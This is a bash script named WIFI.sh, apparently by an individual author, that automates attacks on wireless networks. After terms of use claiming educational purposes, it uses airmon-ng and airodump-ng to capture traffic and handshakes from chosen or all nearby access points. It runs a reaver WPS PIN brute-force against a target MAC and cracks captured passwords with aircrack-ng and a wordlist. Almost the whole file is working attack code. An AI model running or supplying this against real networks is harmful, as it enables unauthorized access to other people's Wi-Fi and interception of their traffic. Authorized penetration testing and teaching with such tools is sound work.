#!/bin/bash
# WIFI.sh by AHMED NOAMAN
# email: an758592@gmail.com

# Terms of Use for WIFI.sh Script.
echo "By using the WIFI.sh script you agree to the following terms and conditions:"
echo "1- Usage: The Script is provided for educational and testing purposes only. It is intended to be used by individuals who have the necessary permissions to conduct security testing on wireless networks."
echo "2- Responsibility: You are solely responsible for any actions taken using the Script. This includes but is not limited to scanning for wireless networks, capturing packets, and attempting to crack passwords. You must ensure that your actions comply with all applicable laws and regulations."
echo "3- No Warranty: The Script is provided as is, without any warranty of any kind, express or implied. We do not guarantee the accuracy, reliability, or suitability of the Script for any purpose."
echo "4- No Liability: In no event shall the authors of the Script be liable for any direct, indirect, incidental, special, exemplary, or consequential damages (including, but not limited to, procurement of substitute goods or services; loss of use, data, or profits; or business interruption) arising in any way out of the use of the Script, even if advised of the possibility of such damage."
echo "5- Ethical Use: You agree to use the Script ethically and responsibly. This includes obtaining proper authorization before testing networks that you do not own or have explicit permission to test."
echo "6- Compliance: You agree to comply with all applicable laws, regulations, and ethical guidelines when using the Script. This includes but is not limited to laws related to network security, privacy, and data protection."
echo "7- Indemnification: You agree to indemnify and hold harmless the authors of the Script from any claims, damages, or liabilities arising out of your use of the Script, including but not limited to any claims relating to unauthorized access to networks or data."
echo "8- Modification: You may modify the Script for your own personal use. However, you may not distribute or publish modified versions of the Script without the explicit permission of the authors."
echo "9- Termination: I reserve the right to terminate or suspend your access to the Script at any time, without prior notice or liability, for any reason whatsoever."
echo "10- Acceptance: By using the Script, you acknowledge that you have read, understood, and agree to be bound by these terms and conditions."

# Requiring the user to agree to the terms of use.
read -p "Do you agree with these terms? [y=YES-continue/n=NO-exit] : " terms

# Check if the user agrees to the terms of use.
if [ "$terms" != y ]; then
    echo "You are not authorized to use the Script."
    exit
fi

clear

# Check if the script is being run with sudo.
if [ "$(id -u)" != 0 ]; then
    echo "Please, run the script as root or use : [sudo]."
    exit
fi

# Check if necessary tools are installed.
required_tools=("aircrack-ng" "airodump-ng" "airmon-ng" "reaver")
for tool in "${required_tools[@]}"; do
    if ! command -v "$tool"; then
        echo "Required tool '$tool' not found. Please install it and try again."
        exit
    fi
done

clear

ip add

# Prompt the user to enter the wireless interface to be used.
read -p "Enter the interface [default=wlan0] : " interface
interface=${interface:-wlan0}

# Prompt the user to enter the path to save captured data.
read -p "Enter the path to the capfile [default=/home/user/] : " cap
cap=${cap:-/home/"$USER"/}

# Prompt the user to enter the path to the wordlist file for password cracking.
read -p "Enter the path to the wordlist [default=/home/user/wordlist.txt] : " wordlist
wordlist=${wordlist:-/home/"$USER"/wordlist.txt}

# Start monitor mode.
airmon-ng check kill
airmon-ng start "$interface"

clear

# Prompt the user to select mode.
read -p "Enter the mode number [1=scan-ONE/2=scan-ALL/3=WPS-attack] : " mode

# Depending on the mode selected, perform specific actions.
if [ "$mode" = 1 ]; then
    airodump-ng --wps "$interface"mon
    read -p "Enter the AP MAC [TARGET] : " amac
    read -p "Enter the channel number [1:13] : " channel
    airodump-ng -c "$channel" --bssid "$amac" --output-format pcap --wps -w "$cap" "$interface"mon
elif [ "$mode" = 2 ]; then
    airodump-ng --output-format pcap --wps -w "$cap" "$interface"mon
elif [ "$mode" = 3 ]; then
    airodump-ng --wps "$interface"mon
    read -p "Enter the AP MAC [TARGET] : " amac
    read -p "Enter the channel number [1:13] : " channel
    reaver -i "$interface"mon -c "$channel" -b "$amac" -vv
else
    airmon-ng stop "$interface"mon
    service NetworkManager restart
    exit
fi

clear

# Prompt the user if they want to start password cracking.
read -p "Do you want to start password cracking now? [y=YES-continue/n=NO-exit] : " continue

# If the user chooses to start password cracking.
if [ "$continue" = y ]; then
    airmon-ng stop "$interface"mon
    service NetworkManager restart
    aircrack-ng -w "$wordlist" "$cap"-01.cap
else
    airmon-ng stop "$interface"mon
    service NetworkManager restart
    exit
fi
